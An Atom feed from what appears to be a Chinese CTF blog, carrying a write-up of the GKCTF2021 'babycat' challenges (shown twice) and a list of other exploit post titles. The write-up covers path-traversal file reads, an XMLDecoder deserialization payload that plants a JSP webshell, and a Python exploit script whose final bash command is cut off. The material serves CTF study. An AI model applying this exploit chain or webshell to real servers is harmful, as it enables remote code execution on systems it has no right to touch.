<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://guokeya.github.io</id>
    <title> </title>
    <updated>2021-06-28T02:16:09.541Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://guokeya.github.io"/>
    <link rel="self" href="https://guokeya.github.io/atom.xml"/>
    <subtitle>你与春风皆过客</subtitle>
    <logo>https://guokeya.github.io/images/avatar.png</logo>
    <icon>https://guokeya.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021,  </rights>
    <entry>
        <title type="html"><![CDATA[GKCTF2021 babycat]]></title>
        <id>https://guokeya.github.io/post/EDdJOsBGk/</id>
        <link href="https://guokeya.github.io/post/EDdJOsBGk/">
        </link>
        <updated>2021-06-28T01:28:23.000Z</updated>
        <summary type="html"><![CDATA[<h1 id="babycat">babycat</h1>
<p>首先F12能看到JS代码。</p>
<pre><code> if($(&quot;#login-button&quot;).val()==&quot;Log In&quot;){
            $.ajax({
                url:&quot;/login&quot;,
                type:&quot;post&quot;,
                contentType: &quot;application/x-www-form-urlencoded; charset=utf-8&quot;,
                data: &quot;data=&quot;+JSON.stringify(formObject),
                dataType: &quot;text&quot;,
                success:function(result){
                    var res = JSON.parse(result);
                    alert(res.msg)
                    if (res.msg==&quot;login success!&quot;){
                        //alert(res.msg)
                        window.location.href=&quot;./home&quot;;
                    }
                }
            });
</code></pre>
<p>可以构造如下请求</p>
<pre><code>data={&quot;username&quot;:&quot;guoke&quot;,&quot;password&quot;:&quot;guoke&quot;}
</code></pre>
<p>但是这里是用于login的。。register并没有参数。所以将这些参数。直接打register。发现注册成功。之后登陆有个download Test。存在任意文件下载<br>
一般Java题。都是下web.xml-&gt;class-&gt;审计-&gt;RCE     老套路了<br>
反手一个../web.xml。读到了。<br>
<img src="https://guokeya.github.io/post-images/1624844689065.png" alt="" loading="lazy"><br>
照着web.xml读class。由于web.xml是在WEB-INF下。所以我们../就能跳到WEB-INF</p>
<pre><code>com.web.servlet.loginServlet-&gt; ../classes/com/web/servlet/loginServlet.class
</code></pre>
<p>依次读源码，着重看upload逻辑<br>
<img src="https://guokeya.github.io/post-images/1624845331667.png" alt="" loading="lazy"><br>
可以看到forward之后没有return。所以后面的代码会继续执行。<br>
可以把这个理解为php中install过了。就直接location到其他页面。但是没die();<br>
java的forward是执行完当前所有代码然后才会执行forward那个文件的代码<br>
具体可以看<code>https://blog.csdn.net/qq_22075041/article/details/78736723</code></p>
<p>所以。这里就可以上传任意文件。读/proc/self/environ。可以看到他是tomcat起的。而tomcat有个static文件夹。是可以访问的。所以这里上传无限制。跨目录上传jsp到static下。访问就行</p>
<p>目录结构为</p>
<pre><code>webapps
    static
    WEB-INF
        classes
</code></pre>
<p>这里直接../../static/guoke.jsp完事<br>
<img src="https://guokeya.github.io/post-images/1624846098185.png" alt="" loading="lazy"></p>
<h1 id="babycat-revenge">babycat-revenge</h1>
<p>修复了上一个题的非预期。继续审计代码。现在我们能读文件写文件。然后RCE。<br>
在baseDao.class中有个XMLDecoder。会读取db/db.xml<br>
每次注册或登陆都会调用getConnection-&gt;getConfig-&gt;XMLDecoder<br>
直接搜<code>printwriter xmldecoder 反序列化</code>就有<code>https://www.cnblogs.com/peterpan0707007/p/10565968.html</code></p>
<p>写个js马完事</p>
<pre><code>-----------------------------185101745725986
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;../db/db.xml&quot;
Content-Type: application/octet-stream

&lt;java version=&quot;1.8.0_192&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
    &lt;object class=&quot;java.io.PrintWriter&quot;&gt;
        &lt;string&gt;/usr/local/tomcat/webapps/ROOT/static/GUOKE.jsp&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;
        &lt;string&gt;&lt;![CDATA[`&lt;% javax.script.ScriptEngineManager manager = new javax.script.ScriptEngineManager(null);javax.script.ScriptEngine engine = manager.getEngineByName(&quot;js&quot;);engine.eval(request.getParameter(&quot;guoke&quot;)); %&gt;`
]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;
    &lt;/object&gt;
&lt;/java&gt;
-----------------------------185101745725986--
</code></pre>
<p>然后发个注册请求。就写完了。</p>
<p>EXP:</p>
<pre><code>import requests
import base64
url=&quot;http://dff2f625-4918-4976-bcfa-b018331d658c.node3.buuoj.cn/&quot;
headers={&quot;Cookie&quot;:&quot;JSESSIONID=19EFC6DBE21EBB6AD3F67FCD4DF8C4A0&quot;}
data={&quot;data&quot;:'{&quot;username&quot;:&quot;guoke&quot;,&quot;password&quot;:&quot;guoke&quot;,&quot;role&quot;:&quot;123&quot;,&quot;role&quot;/**/:&quot;admin&quot;}'}
files = {&quot;file&quot;: (&quot;../db/db.xml&quot;, base64.b64decode(&quot;PGphdmEgdmVyc2lvbj0iMS44LjBfMTkyIiBjbGFzcz0iamF2YS5iZWFucy5YTUxEZWNvZGVyIj4KICAgIDxvYmplY3QgY2xhc3M9ImphdmEuaW8uUHJpbnRXcml0ZXIiPgogICAgICAgIDxzdHJpbmc+L3Vzci9sb2NhbC90b21jYXQvd2ViYXBwcy9ST09UL3N0YXRpYy9HVU9LRS5qc3A8L3N0cmluZz48dm9pZCBtZXRob2Q9InByaW50bG4iPgogICAgICAgIDxzdHJpbmc+PCFbQ0RBVEFbYDwlIGphdmF4LnNjcmlwdC5TY3JpcHRFbmdpbmVNYW5hZ2VyIG1hbmFnZXIgPSBuZXcgamF2YXguc2NyaXB0LlNjcmlwdEVuZ2luZU1hbmFnZXIobnVsbCk7amF2YXguc2NyaXB0LlNjcmlwdEVuZ2luZSBlbmdpbmUgPSBtYW5hZ2VyLmdldEVuZ2luZUJ5TmFtZSgianMiKTtlbmdpbmUuZXZhbChyZXF1ZXN0LmdldFBhcmFtZXRlcigiZ3Vva2UiKSk7ICU+YApdXT48L3N0cmluZz48L3ZvaWQ+PHZvaWQgbWV0aG9kPSJjbG9zZSIvPgogICAgPC9vYmplY3Q+CjwvamF2YT4=&quot;))}
requests.post(url+&quot;/register&quot;,headers=headers,data=data)
requests.post(url+&quot;/login&quot;,headers=headers,data={&quot;data&quot;:'{&quot;username&quot;:&quot;guoke&quot;,&quot;password&quot;:&quot;guoke&quot;}'})
requests.post(url+&quot;/home/upload&quot;,headers=headers,files=files)
requests.post(url+&quot;/register&quot;,headers=headers,data=data)
requests.post(url+&quot;/static/GUOKE.jsp&quot;,data={&quot;guoke&quot;:&quot;function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\&quot;bash -c {echo,
</code></pre>
]]></summary>
        <content type="html"><![CDATA[<h1 id="babycat">babycat</h1>
<p>首先F12能看到JS代码。</p>
<pre><code> if($(&quot;#login-button&quot;).val()==&quot;Log In&quot;){
            $.ajax({
                url:&quot;/login&quot;,
                type:&quot;post&quot;,
                contentType: &quot;application/x-www-form-urlencoded; charset=utf-8&quot;,
                data: &quot;data=&quot;+JSON.stringify(formObject),
                dataType: &quot;text&quot;,
                success:function(result){
                    var res = JSON.parse(result);
                    alert(res.msg)
                    if (res.msg==&quot;login success!&quot;){
                        //alert(res.msg)
                        window.location.href=&quot;./home&quot;;
                    }
                }
            });
</code></pre>
<p>可以构造如下请求</p>
<pre><code>data={&quot;username&quot;:&quot;guoke&quot;,&quot;password&quot;:&quot;guoke&quot;}
</code></pre>
<p>但是这里是用于login的。。register并没有参数。所以将这些参数。直接打register。发现注册成功。之后登陆有个download Test。存在任意文件下载<br>
一般Java题。都是下web.xml-&gt;class-&gt;审计-&gt;RCE     老套路了<br>
反手一个../web.xml。读到了。<br>
<img src="https://guokeya.github.io/post-images/1624844689065.png" alt="" loading="lazy"><br>
照着web.xml读class。由于web.xml是在WEB-INF下。所以我们../就能跳到WEB-INF</p>
<pre><code>com.web.servlet.loginServlet-&gt; ../classes/com/web/servlet/loginServlet.class
</code></pre>
<p>依次读源码，着重看upload逻辑<br>
<img src="https://guokeya.github.io/post-images/1624845331667.png" alt="" loading="lazy"><br>
可以看到forward之后没有return。所以后面的代码会继续执行。<br>
可以把这个理解为php中install过了。就直接location到其他页面。但是没die();<br>
java的forward是执行完当前所有代码然后才会执行forward那个文件的代码<br>
具体可以看<code>https://blog.csdn.net/qq_22075041/article/details/78736723</code></p>
<p>所以。这里就可以上传任意文件。读/proc/self/environ。可以看到他是tomcat起的。而tomcat有个static文件夹。是可以访问的。所以这里上传无限制。跨目录上传jsp到static下。访问就行</p>
<p>目录结构为</p>
<pre><code>webapps
    static
    WEB-INF
        classes
</code></pre>
<p>这里直接../../static/guoke.jsp完事<br>
<img src="https://guokeya.github.io/post-images/1624846098185.png" alt="" loading="lazy"></p>
<h1 id="babycat-revenge">babycat-revenge</h1>
<p>修复了上一个题的非预期。继续审计代码。现在我们能读文件写文件。然后RCE。<br>
在baseDao.class中有个XMLDecoder。会读取db/db.xml<br>
每次注册或登陆都会调用getConnection-&gt;getConfig-&gt;XMLDecoder<br>
直接搜<code>printwriter xmldecoder 反序列化</code>就有<code>https://www.cnblogs.com/peterpan0707007/p/10565968.html</code></p>
<p>写个js马完事</p>
<pre><code>-----------------------------185101745725986
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;../db/db.xml&quot;
Content-Type: application/octet-stream

&lt;java version=&quot;1.8.0_192&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
    &lt;object class=&quot;java.io.PrintWriter&quot;&gt;
        &lt;string&gt;/usr/local/tomcat/webapps/ROOT/static/GUOKE.jsp&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;
        &lt;string&gt;&lt;![CDATA[`&lt;% javax.script.ScriptEngineManager manager = new javax.script.ScriptEngineManager(null);javax.script.ScriptEngine engine = manager.getEngineByName(&quot;js&quot;);engine.eval(request.getParameter(&quot;guoke&quot;)); %&gt;`
]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;
    &lt;/object&gt;
&lt;/java&gt;
-----------------------------185101745725986--
</code></pre>
<p>然后发个注册请求。就写完了。</p>
<p>EXP:</p>
<pre><code>import requests
import base64
url=&quot;http://dff2f625-4918-4976-bcfa-b018331d658c.node3.buuoj.cn/&quot;
headers={&quot;Cookie&quot;:&quot;JSESSIONID=19EFC6DBE21EBB6AD3F67FCD4DF8C4A0&quot;}
data={&quot;data&quot;:'{&quot;username&quot;:&quot;guoke&quot;,&quot;password&quot;:&quot;guoke&quot;,&quot;role&quot;:&quot;123&quot;,&quot;role&quot;/**/:&quot;admin&quot;}'}
files = {&quot;file&quot;: (&quot;../db/db.xml&quot;, base64.b64decode(&quot;PGphdmEgdmVyc2lvbj0iMS44LjBfMTkyIiBjbGFzcz0iamF2YS5iZWFucy5YTUxEZWNvZGVyIj4KICAgIDxvYmplY3QgY2xhc3M9ImphdmEuaW8uUHJpbnRXcml0ZXIiPgogICAgICAgIDxzdHJpbmc+L3Vzci9sb2NhbC90b21jYXQvd2ViYXBwcy9ST09UL3N0YXRpYy9HVU9LRS5qc3A8L3N0cmluZz48dm9pZCBtZXRob2Q9InByaW50bG4iPgogICAgICAgIDxzdHJpbmc+PCFbQ0RBVEFbYDwlIGphdmF4LnNjcmlwdC5TY3JpcHRFbmdpbmVNYW5hZ2VyIG1hbmFnZXIgPSBuZXcgamF2YXguc2NyaXB0LlNjcmlwdEVuZ2luZU1hbmFnZXIobnVsbCk7amF2YXguc2NyaXB0LlNjcmlwdEVuZ2luZSBlbmdpbmUgPSBtYW5hZ2VyLmdldEVuZ2luZUJ5TmFtZSgianMiKTtlbmdpbmUuZXZhbChyZXF1ZXN0LmdldFBhcmFtZXRlcigiZ3Vva2UiKSk7ICU+YApdXT48L3N0cmluZz48L3ZvaWQ+PHZvaWQgbWV0aG9kPSJjbG9zZSIvPgogICAgPC9vYmplY3Q+CjwvamF2YT4=&quot;))}
requests.post(url+&quot;/register&quot;,headers=headers,data=data)
requests.post(url+&quot;/login&quot;,headers=headers,data={&quot;data&quot;:'{&quot;username&quot;:&quot;guoke&quot;,&quot;password&quot;:&quot;guoke&quot;}'})
requests.post(url+&quot;/home/upload&quot;,headers=headers,files=files)
requests.post(url+&quot;/register&quot;,headers=headers,data=data)
requests.post(url+&quot;/static/GUOKE.jsp&quot;,data={&quot;guoke&quot;:&quot;function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\&quot;bash -c {echo,
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[PbootCMS最新版前台RCE(3.0.4)]]></title>
        <id>https://guokeya.github.io/post/VL0ntICBC/</id>
        <link href="https://guokeya.github.io/post/VL0ntICBC/">
        </link>
        <updated>2021-06-17T01:50:21.000Z</updated>
    </entry>
    <entry>
        <title type="html"><![CDATA[[QWB2021 Quals]陀那多]]></title>
        <id>https://guokeya.github.io/post/SZkQ4b1G/</id>
        <link href="https://guokeya.github.io/post/SZkQ4b1G/">
        </link>
        <updated>2021-06-15T01:01:41.000Z</updated>
    </entry>
    <entry>
        <title type="html"><![CDATA[津门杯GoOSS 题解]]></title>
        <id>https://guokeya.github.io/post/5IcFhBKyk/</id>
        <link href="https://guokeya.github.io/post/5IcFhBKyk/">
        </link>
        <updated>2021-05-09T07:44:17.000Z</updated>
    </entry>
    <entry>
        <title type="html"><![CDATA[从虎符线下CTF深入反序列化利用]]></title>
        <id>https://guokeya.github.io/post/uxwHLckwx/</id>
        <link href="https://guokeya.github.io/post/uxwHLckwx/">
        </link>
        <updated>2021-04-28T01:43:41.000Z</updated>
    </entry>
    <entry>
        <title type="html"><![CDATA[虎符2021线下  tinypng ]]></title>
        <id>https://guokeya.github.io/post/z5gHcmbVj/</id>
        <link href="https://guokeya.github.io/post/z5gHcmbVj/">
        </link>
        <updated>2021-04-27T13:42:17.000Z</updated>
    </entry>
    <entry>
        <title type="html"><![CDATA[红明谷数据安全大赛线下赛Discuz题解]]></title>
        <id>https://guokeya.github.io/post/87yhVz7uW/</id>
        <link href="https://guokeya.github.io/post/87yhVz7uW/">
        </link>
        <updated>2021-04-19T08:56:21.000Z</updated>
    </entry>
    <entry>
        <title type="html"><![CDATA[V&NCTF Easy_Laravel  Writeup]]></title>
        <id>https://guokeya.github.io/post/e_LgG7X5A/</id>
        <link href="https://guokeya.github.io/post/e_LgG7X5A/">
        </link>
        <updated>2021-03-15T04:20:53.000Z</updated>
    </entry>
    <entry>
        <title type="html"><![CDATA[AntCTF x D^3CTF calc pool]]></title>
        <id>https://guokeya.github.io/post/ZN3xqG-rM/</id>
        <link href="https://guokeya.github.io/post/ZN3xqG-rM/">
        </link>
        <updated>2021-03-08T06:06:59.000Z</updated>
    </entry>
    <entry>
        <title type="html"><![CDATA[AntCTF x D^3CTF non RCE?]]></title>
        <id>https://guokeya.github.io/post/o7CJqUnTn/</id>
        <link href="https://guokeya.github.io/post/o7CJqUnTn/">
        </link>
        <updated>2021-03-08T02:32:25.000Z</updated>
    </entry>
</feed>